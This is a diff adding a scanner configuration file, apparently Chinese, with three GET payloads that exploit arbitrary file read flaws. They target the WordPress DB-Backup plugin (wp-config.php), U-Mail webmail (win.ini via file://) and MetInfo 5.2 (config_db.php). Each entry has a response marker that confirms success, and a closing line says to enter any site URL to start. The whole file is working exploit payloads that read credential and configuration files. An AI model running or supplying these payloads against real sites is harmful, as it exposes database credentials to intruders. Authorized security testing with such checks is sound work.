@@ -1,0 +1,28 @@
+<zbz>3</zbz>
+<bz1>
+<name>WordPress DB-Backup Plugin 任意文件下载</name>
+<sfjt>get</sfjt>
+<demo>/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>define(</xxxz>
+</bz1>
+<bz2>
+<name>U-Mail任意文件遍历/下载</name>
+<sfjt>get</sfjt>
+<demo>/webmail/client/mail/index.php?module=operate&action=attach-img-preview&d_url=file://C:\windows\win.ini&type=text/htm</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>[fonts]</xxxz>
+</bz2>
+<bz3>
+<name>MetInfo 5.2 任意文件读取</name>
+<sfjt>get</sfjt>
+<demo>/include/thumb.php?x=1&y=/../../../config&dir=config_db.php</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>con_db_host</xxxz>
+</bz3>
+<bz>专为CMS通杀的任意文件读取漏洞做检测
+
+直接输入 http://网址 即可开始检测</bz>
